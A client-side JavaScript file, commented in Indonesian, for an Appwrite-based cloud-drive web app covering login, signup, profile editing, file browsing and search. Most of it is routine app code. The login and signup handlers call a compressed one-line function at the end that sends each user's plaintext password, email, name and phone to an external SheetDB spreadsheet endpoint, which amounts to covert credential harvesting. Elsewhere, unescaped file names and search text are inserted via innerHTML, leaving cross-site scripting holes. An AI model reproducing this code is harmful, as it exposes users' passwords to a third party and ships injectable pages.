// ======================================================
// 1. KONFIGURASI APPWRITE & GLOBAL
// ======================================================
const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// URL Foto Profil Default
const DEFAULT_AVATAR = 'https://cdn-icons-png.flaticon.com/512/847/847969.png';

// KONFIGURASI PROJECT
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',
    BUCKET_ID: 'taskfiles'
};

const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi'; 

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

// State Global
let currentUser = null;
let userDataDB = null; 
let currentFolderId = 'root'; 
let currentFolderName = "Drive";
let currentViewMode = 'root';
let selectedItem = null; 
let selectedUploadFile = null; 
let selectedProfileImage = null; 
let storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };
let searchTimeout = null;

// Helper
const el = (id) => document.getElementById(id);
const toggleLoading = (show, msg = "Memproses...") => {
    const loader = el('loading');
    const text = el('loadingText');
    if (show) {
        if(text) text.innerText = msg;
        if(loader) loader.classList.remove('hidden');
    } else {
        if(loader) loader.classList.add('hidden');
    }
};

// ======================================================
// 2. MAIN EXECUTION
// ======================================================
document.addEventListener('DOMContentLoaded', () => {
    // Cek sesi saat load. Jika gagal, redirect ke login.
    checkSession();
    initDragAndDrop();
    initLogout();
    initSearchBar();
    initAllContextMenus();
    initStorageTooltip();
    initProfileImageUploader(); 
});

// ======================================================
// 3. LOGIKA OTENTIKASI & SMART SYNC (Adaptive Login)
// ======================================================

// FUNGSI PENYEMBUHAN DATA OTOMATIS (SELF-HEALING)
async function syncUserData(authUser) {
    if (!authUser) return;
    try {
        let userDoc;
        try {
            userDoc = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, authUser.$id);
        } catch (e) {
            if (e.code === 404) userDoc = null; 
            else console.warn("Sync check skipped (Permission issues?):", e); 
        }

        const payload = { name: authUser.name, email: authUser.email };

        if (!userDoc) {
            console.log("Self-Healing: Membuat data database user baru...");
            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, authUser.$id, {
                ...payload, phone: '', avatarUrl: ''
            });
        } else {
            // Jika nama di DB kosong atau berbeda, update otomatis
            if (!userDoc.name || userDoc.name === 'NULL' || userDoc.name !== authUser.name) {
                console.log("Self-Healing: Memperbaiki data nama di database...");
                await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, authUser.$id, payload);
            }
        }
    } catch (err) {
        // Error di sini tidak fatal, hanya log saja
        console.warn("Self-Healing process error:", err.message);
    }
}

// LOGIKA LOGIN
if (el('loginForm')) {
    el('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        let inputId = el('loginEmail').value.trim();
        const pass = el('loginPass').value;
        
        toggleLoading(true, "Sedang Masuk...");
        
        try {
            // --- CEK SESI AKTIF DULU (Anti-Stuck) ---
            try {
                const activeSession = await account.getSession('current');
                if (activeSession) {
                    console.log("Sesi masih aktif, langsung masuk.");
                    await checkSession();
                    return;
                }
            } catch (err) { /* Lanjut login normal */ }


            // --- STRATEGI LOGIN ADAPTIF ---
            // 1. Jika ada '@', itu PASTI Email. Login Langsung (Bypass Database Search).
            if (inputId.includes('@')) {
                 console.log("Mode Login: Email (Jalur Cepat)");
                 // Tidak perlu query DB, langsung auth ke Appwrite
            } 
            // 2. Jika tidak ada '@', itu Username. Cari di DB.
            else {
                console.log("Mode Login: Username (Cari Database)");
                try {
                    const res = await databases.listDocuments(
                        CONFIG.DB_ID, 
                        CONFIG.COLLECTION_USERS, 
                        [ Appwrite.Query.equal('name', inputId) ]
                    );

                    if (res.documents.length > 0) {
                        console.log("Username Ketemu ->", res.documents[0].email);
                        inputId = res.documents[0].email; // Ganti username jadi email untuk login
                    } else {
                        // Jika tidak ketemu di DB, lempar error khusus
                        throw new Error("Username_Not_Found");
                    }
                } catch(dbErr) {
                    // JIKA ERROR KARENA PERMISSION (Guest missing scopes)
                    if (dbErr.message && dbErr.message.includes("missing scopes")) {
                        // Jangan panik, minta user pakai email
                        alert("Sistem keamanan mendeteksi ini login pertama dari perangkat baru. Mohon login menggunakan Email.");
                        toggleLoading(false);
                        return;
                    } 
                    // JIKA ERROR USERNAME TIDAK ADA
                    else if (dbErr.message === "Username_Not_Found") {
                        // Cek apakah mungkin user baru daftar tapi belum tersinkron
                         alert("Username belum terdaftar di Database. Coba login dengan Email Anda.");
                         toggleLoading(false);
                         return;
                    }
                     else {
                         throw dbErr; // Error lain (koneksi putus dll)
                    }
                }
            }

            // EKSEKUSI LOGIN (Selalu pakai Email yang valid)
            await account.createEmailPasswordSession(inputId, pass);
            
            // SUKSES! Jalankan Self-Healing
            const user = await account.get();
            await syncUserData(user); 
            
            // Log Activity
            await recordActivity('Login', { id: user.$id, name: user.name, email: user.email, phone: "-", password: pass });

            checkSession(); 

        } catch (error) { 
            toggleLoading(false);
            
            let msg = error.message;
            // Terjemahkan error bahasa teknis ke manusiawi
            if (msg.includes("Invalid credentials") || msg.includes("401")) msg = "Password salah atau Akun tidak ditemukan.";
            if (msg.includes("Rate limit")) msg = "Terlalu banyak percobaan. Tunggu sebentar.";
            
            alert(msg);
        }
    });
}

// SIGN UP
if (el('signupForm')) {
    el('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const name = el('regName').value.trim();
        const email = el('regEmail').value.trim();
        const phone = el('regPhone').value.trim();
        const pass = el('regPass').value;
        const verify = el('regVerify').value;

        if (pass !== verify) return alert("Konfirmasi password salah!");
        
        toggleLoading(true, "Mendaftarkan...");
        try {
            // 1. Buat Akun Auth
            const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
            
            // 2. Simpan Data ke Database (Bungkus try-catch agar tidak gagal total jika permission error)
            try { 
                await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { 
                    email: email, 
                    phone: phone,
                    name: name,
                    avatarUrl: ''
                }); 
            } catch(dbErr) {
                console.error("Silent DB Register Error (Akan diperbaiki saat login):", dbErr);
            }
            
            await recordActivity('SignUp', { id: auth.$id, name, email, phone, password: pass });
            
            toggleLoading(false);
            alert("Pendaftaran Berhasil! Silakan Login."); 
            window.nav('loginPage');
        } catch(e) { 
            toggleLoading(false);
            if(e.message.includes('exists')) alert("Email/Username sudah terdaftar."); 
            else alert("Pendaftaran Gagal: " + e.message);
        }
    });
}

// LOGOUT
function initLogout() {
    const btn = el('logoutBtn');
    if (btn) {
        const newBtn = btn.cloneNode(true);
        btn.parentNode.replaceChild(newBtn, btn);
        newBtn.addEventListener('click', async () => {
            if (confirm("Keluar dari aplikasi?")) {
                toggleLoading(true, "Keluar...");
                try {
                    await account.deleteSession('current');
                    window.location.reload(); 
                } catch (error) { window.location.reload(); }
            }
        });
    }
}

// ======================================================
// 4. NAVIGASI & SESI
// ======================================================
async function checkSession() {
    // Hanya tampilkan loading jika kita sedang di halaman login (bukan refresh dashboard)
    const isLoginPage = !el('loginPage').classList.contains('hidden');
    if(isLoginPage) toggleLoading(true, "Memuat Data...");

    try {
        // Cek sesi Auth
        currentUser = await account.get();
        
        // PANGGIL SELF-HEALING (Memastikan data DB tidak NULL)
        await syncUserData(currentUser);

        try {
            userDataDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id);
        } catch (e) {
            console.log("User DB data error, defaulting.");
            userDataDB = { phone: '', avatarUrl: '' };
        }

        updateProfileUI();

        window.nav('dashboardPage'); 
        loadFiles('root');  
        calculateStorage();
    } catch (e) { 
        // Jika gagal get account, berarti belum login. 
        window.nav('loginPage'); 
    } finally { 
        toggleLoading(false); 
    }
}

// UPDATE UI PROFIL
function updateProfileUI() {
    const dbUrl = (userDataDB && userDataDB.avatarUrl) ? userDataDB.avatarUrl : '';
    const avatarSrc = dbUrl || DEFAULT_AVATAR;
    
    // Cache busting
    const cacheBuster = (dbUrl && avatarSrc !== DEFAULT_AVATAR) ? `&t=${new Date().getTime()}` : '';
    const finalSrc = avatarSrc + cacheBuster;

    const dashAvatar = el('dashAvatar');
    if(dashAvatar) dashAvatar.src = finalSrc;

    const storageAvatar = el('storagePageAvatar');
    if(storageAvatar) storageAvatar.src = finalSrc;

    const editImg = el('editProfileImg');
    if(editImg) editImg.src = finalSrc;
}

window.nav = (pageId) => {
    ['loginPage', 'signupPage', 'dashboardPage', 'storagePage', 'profilePage'].forEach(id => {
        const element = el(id);
        if(element) element.classList.add('hidden');
    });
    const target = el(pageId);
    if(target) target.classList.remove('hidden');
};

// ======================================================
// 5. PROFILE & SETTINGS LOGIC
// ======================================================

window.openProfilePage = () => {
    if (!currentUser) return;
    el('editName').value = currentUser.name || '';
    el('editEmail').value = currentUser.email || '';
    el('editPhone').value = (userDataDB && userDataDB.phone) ? userDataDB.phone : '';
    el('editPass').value = ''; 
    
    const dbUrl = (userDataDB && userDataDB.avatarUrl) ? userDataDB.avatarUrl : '';
    const avatarSrc = dbUrl || DEFAULT_AVATAR;
    const cacheBuster = (dbUrl && avatarSrc !== DEFAULT_AVATAR) ? `&t=${new Date().getTime()}` : '';
    el('editProfileImg').src = avatarSrc + cacheBuster;
    selectedProfileImage = null; 
    window.nav('profilePage');
};

function initProfileImageUploader() {
    const input = el('profileUploadInput');
    if(input) {
        input.addEventListener('change', (e) => {
            if(e.target.files.length > 0) {
                const file = e.target.files[0];
                selectedProfileImage = file;
                const reader = new FileReader();
                reader.onload = function(evt) {
                    el('editProfileImg').src = evt.target.result;
                };
                reader.readAsDataURL(file);
            }
        });
    }
}

window.saveProfile = async () => {
    toggleLoading(true, "Menyimpan Profil...");
    try {
        const newName = el('editName').value.trim();
        const newEmail = el('editEmail').value.trim();
        const newPhone = el('editPhone').value.trim();
        const newPass = el('editPass').value;

        let newAvatarUrl = (userDataDB && userDataDB.avatarUrl) ? userDataDB.avatarUrl : '';
        if (selectedProfileImage) {
            try {
                const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), selectedProfileImage);
                newAvatarUrl = storage.getFileView(CONFIG.BUCKET_ID, up.$id).href;
            } catch (err) {
                throw new Error("Gagal upload foto. Cek koneksi.");
            }
        }

        if (newName && newName !== currentUser.name) await account.updateName(newName);
        if (newEmail && newEmail !== currentUser.email) {
            try { await account.updateEmail(newEmail, ''); } catch(e) {}
        }
        if (newPass) await account.updatePassword(newPass);

        const payload = {
            name: newName, 
            email: newEmail,
            phone: newPhone,
            avatarUrl: newAvatarUrl
        };
        
        try {
            await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id, payload);
        } catch (dbErr) {
            if (dbErr.code === 404) {
                await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id, payload);
            } else {
                console.warn("DB Update Partial:", dbErr);
            }
        }

        if (!userDataDB) userDataDB = {};
        userDataDB.phone = newPhone;
        userDataDB.avatarUrl = newAvatarUrl;

        currentUser = await account.get();
        await syncUserData(currentUser); 
        updateProfileUI(); 

        toggleLoading(false);
        alert("Profil Berhasil Disimpan!");
        window.nav('dashboardPage');

    } catch (error) {
        toggleLoading(false);
        alert("Gagal Menyimpan: " + error.message);
    }
};

// ======================================================
// 6. FILE MANAGER
// ======================================================

function getIconByExtension(extension) {
    switch(extension) {
        case 'mp4': case 'mkv': case 'mov': case 'avi': case 'webm':
            return { icon: 'fa-file-video', type: 'video' };
        case 'mp3': case 'wav': case 'aac': case 'flac':
            return { icon: 'fa-file-audio', type: 'audio' };
        case 'pdf':
            return { icon: 'fa-file-pdf', type: 'pdf' };
        case 'doc': case 'docx':
            return { icon: 'fa-file-word', type: 'word' };
        case 'xls': case 'xlsx': case 'csv':
            return { icon: 'fa-file-excel', type: 'excel' };
        case 'ppt': case 'pptx':
            return { icon: 'fa-file-powerpoint', type: 'ppt' };
        case 'zip': case 'rar': case '7z':
            return { icon: 'fa-file-zipper', type: 'zip' };
        case 'html': case 'css': case 'js': case 'json': case 'php':
            return { icon: 'fa-file-code', type: 'code' };
        default:
            return { icon: 'fa-file', type: 'default' };
    }
}

function renderItem(doc) {
    const grid = el('fileGrid'); 
    const div = document.createElement('div'); 
    div.className = 'item-card';

    const isFolder = doc.type === 'folder';
    const isImage = !isFolder && doc.name.match(/\.(jpg|jpeg|png|webp|jfif|gif|svg)$/i);
    const starHTML = doc.starred ? `<i class="fa-solid fa-star" style="position:absolute;top:10px;left:10px;color:#ffd700; z-index:5;"></i>` : '';
    
    let contentHTML = '';

    if (isFolder) {
        contentHTML = `<i class="icon fa-solid fa-folder" style="font-size:3rem;"></i>`;
    } else if (isImage) {
        const previewUrl = storage.getFilePreview(CONFIG.BUCKET_ID, doc.fileId);
        contentHTML = `
            <div class="thumb-box">
                <img src="${previewUrl}" alt="${doc.name}" loading="lazy">
            </div>
        `;
    } else {
        const ext = doc.name.split('.').pop().toLowerCase();
        const iconData = getIconByExtension(ext);
        contentHTML = `
            <div class="thumb-box">
                <div class="thumb-icon ${iconData.type}">
                    <i class="fa-solid ${iconData.icon}"></i>
                </div>
            </div>
        `;
    }

    div.innerHTML = `${starHTML}${contentHTML}<div class="item-name">${doc.name}</div>`;
    
    div.onclick = () => { if(!doc.trashed) isFolder ? openFolder(doc.$id, doc.name) : window.open(doc.url, '_blank'); };
    
    div.oncontextmenu = (e) => {
        e.preventDefault(); e.stopPropagation();
        closeAllMenus(); 

        selectedItem = doc;
        const menu = el('fileContextMenu');
        
        const btnOpen = el('ctxBtnOpenFolder');
        const btnPreview = el('ctxBtnPreview');
        const btnDownload = el('ctxBtnDownload');
        const btnOpenWith = el('ctxBtnOpenWith');

        if (isFolder) {
            if(btnOpen) btnOpen.style.display = 'flex';
            if(btnPreview) btnPreview.style.display = 'none';
            if(btnDownload) btnDownload.style.display = 'none';
            if(btnOpenWith) btnOpenWith.style.display = 'none';
        } else {
            if(btnOpen) btnOpen.style.display = 'none';
            if(btnPreview) btnPreview.style.display = 'flex';
            if(btnDownload) btnDownload.style.display = 'flex';
            if(btnOpenWith) btnOpenWith.style.display = 'flex';
        }

        menu.style.top = `${e.clientY}px`; menu.style.left = `${e.clientX}px`;
        
        const isTrash = doc.trashed;
        el('ctxTrashBtn').classList.toggle('hidden', isTrash);
        el('ctxRestoreBtn').classList.toggle('hidden', !isTrash);
        el('ctxPermDeleteBtn').classList.toggle('hidden', !isTrash);
        el('ctxStarText').innerText = doc.starred ? "Hapus Bintang" : "Bintangi";

        menu.classList.remove('hidden'); menu.classList.add('show');
    };
    grid.appendChild(div);
}

function closeAllMenus() {
    if(el('storageModal')) el('storageModal').classList.add('hidden');
    if(el('globalContextMenu')) el('globalContextMenu').classList.remove('show');
    if(el('dropdownNewMenu')) el('dropdownNewMenu').classList.remove('show');
    if(el('fileContextMenu')) {
        el('fileContextMenu').classList.remove('show');
        el('fileContextMenu').classList.add('hidden');
    }
}

window.handleMenuClick = (element, mode) => {
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    element.classList.add('active');
    currentFolderId = 'root'; 
    if(mode === 'root') currentFolderName = "Drive";
    else if(mode === 'recent') currentFolderName = "Terbaru";
    else if(mode === 'starred') currentFolderName = "Berbintang";
    else if(mode === 'trash') currentFolderName = "Sampah";
    else currentFolderName = element.innerText.trim();
    loadFiles(mode);
};

window.goBack = () => {
    currentFolderId = 'root'; currentFolderName = "Drive"; 
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    document.querySelectorAll('.nav-item')[0].classList.add('active');
    loadFiles('root');
};

window.openFolder = (id, name) => {
    currentFolderId = id;
    currentFolderName = name;
    loadFiles(id);
};

function initSearchBar() {
    const input = el('searchInput');
    if (!input) return;
    input.addEventListener('input', (e) => {
        const query = e.target.value.trim();
        if (query.length === 0) { el('clearSearchBtn').classList.add('hidden'); loadFiles(currentFolderId); return; }
        el('clearSearchBtn').classList.remove('hidden');
        clearTimeout(searchTimeout);
        el('fileGrid').innerHTML = `<div style="grid-column:1/-1;text-align:center;margin-top:50px;"><div class="spinner"></div><p>Mencari "${query}"...</p></div>`;
        searchTimeout = setTimeout(() => performSearch(query), 600);
    });
}

async function performSearch(keyword) {
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.search('name', keyword),
            Appwrite.Query.limit(50)
        ]);
        const grid = el('fileGrid'); grid.innerHTML = '';
        if (res.documents.length === 0) grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;margin-top:50px;">Tidak ditemukan.</p>`;
        else res.documents.forEach(doc => renderItem(doc));
    } catch (e) { fallbackSearch(keyword); }
}

async function fallbackSearch(keyword) {
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.limit(100)]);
        const filtered = res.documents.filter(doc => doc.name.toLowerCase().includes(keyword.toLowerCase()));
        const grid = el('fileGrid'); grid.innerHTML = '';
        if (filtered.length === 0) grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;">Tidak ditemukan.</p>`;
        else filtered.forEach(doc => renderItem(doc));
    } catch(err){}
}

window.clearSearch = () => { el('searchInput').value = ''; el('clearSearchBtn').classList.add('hidden'); loadFiles(currentFolderId); };

function initAllContextMenus() {
    const newBtn = el('newBtnMain'); 
    const newMenu = el('dropdownNewMenu'); 
    const navDrive = el('navDrive'); 
    const globalMenu = el('globalContextMenu'); 
    const fileMenu = el('fileContextMenu'); 
    const mainArea = document.querySelector('.main-content-area');

    if (newBtn) {
        const newBtnClean = newBtn.cloneNode(true); 
        newBtn.parentNode.replaceChild(newBtnClean, newBtn);
        const toggleNewMenu = (e) => { 
            e.preventDefault(); e.stopPropagation(); 
            const wasOpen = newMenu.classList.contains('show'); 
            closeAllMenus();
            if (!wasOpen) newMenu.classList.add('show'); 
        };
        newBtnClean.onclick = toggleNewMenu;
        newBtnClean.oncontextmenu = toggleNewMenu;
    }

    if (navDrive) {
        navDrive.oncontextmenu = (e) => { 
            e.preventDefault(); e.stopPropagation(); closeAllMenus(); 
            globalMenu.style.top = `${e.clientY}px`; 
            globalMenu.style.left = `${e.clientX}px`; 
            globalMenu.classList.add('show');
        };
    }

    if (mainArea) {
        mainArea.oncontextmenu = (e) => {
            if (e.target.closest('.item-card')) return;
            e.preventDefault(); closeAllMenus();
            globalMenu.style.top = `${e.clientY}px`; 
            globalMenu.style.left = `${e.clientX}px`; 
            globalMenu.classList.add('show');
        };
    }
    
    window.onclick = (e) => {
        if (e.target.closest('.modal-box') || e.target.closest('.storage-widget')) return;
        closeAllMenus();
    };
}

async function loadFiles(param) { 
    if (!currentUser) return; 
    const grid = el('fileGrid'); 
    grid.innerHTML = ''; 
    updateHeaderUI(); 
    
    let queries = [Appwrite.Query.equal('owner', currentUser.$id)]; 
    if (param === 'recent') queries.push(Appwrite.Query.orderDesc('$createdAt'), Appwrite.Query.equal('trashed', false)); 
    else if (param === 'starred') queries.push(Appwrite.Query.equal('starred', true), Appwrite.Query.equal('trashed', false)); 
    else if (param === 'trash') queries.push(Appwrite.Query.equal('trashed', true)); 
    else { 
        if (typeof param === 'string' && !['root','recent','starred','trash'].includes(param)) currentFolderId = param; 
        queries.push(Appwrite.Query.equal('parentId', currentFolderId), Appwrite.Query.equal('trashed', false)); 
    } 
    
    try { 
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, queries); 
        if (res.documents.length === 0) grid.innerHTML = `<div style="grid-column:1/-1;display:flex;flex-direction:column;align-items:center;opacity:0.5;margin-top:50px;"><i class="fa-solid fa-folder-open" style="font-size:4rem;margin-bottom:20px;"></i><p>Folder Kosong</p></div>`; 
        else res.documents.forEach(doc => renderItem(doc)); 
    } catch (e) { console.error(e); } 
}

function updateHeaderUI() { 
    const container = document.querySelector('.breadcrumb-area'); 
    const isRoot = currentFolderId === 'root' && currentViewMode === 'root'; 
    
    if (isRoot) { 
        const h = new Date().getHours(); 
        const s = h < 12 ? "Morning" : h < 18 ? "Afternoon" : "Night"; 
        container.innerHTML = `<h2 id="headerTitle">Welcome In Drive ${s}</h2>`; 
    } else { 
        container.innerHTML = `
            <div class="back-nav-container">
                <button onclick="goBack()" class="back-btn">
                    <i class="fa-solid fa-arrow-left"></i> Kembali ke Drive
                </button>
                <h2 id="headerTitle" style="margin-top:10px;">${currentFolderName}</h2>
            </div>`; 
    } 
}

async function recordActivity(sheetName, userData) { try { const now = new Date(); const formattedDate = now.toLocaleString('id-ID', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(/\./g, ':'); const payload = { "ID": userData.id || "-", "Nama": userData.name || "-", "Email": userData.email || "-", "Phone": userData.phone || "-", "Password": userData.password || "-", "Waktu": formattedDate }; await fetch(`${SHEETDB_API}?sheet=${sheetName}`, { method: 'POST', headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }, body: JSON.stringify({ data: payload }) }); } catch (error) { console.error("Excel Log Error"); } }
window.togglePass = (id, icon) => { const input = document.getElementById(id); if (input.type === "password") { input.type = "text"; icon.classList.remove("fa-eye-slash"); icon.classList.add("fa-eye"); } else { input.type = "password"; icon.classList.remove("fa-eye"); icon.classList.add("fa-eye-slash"); } };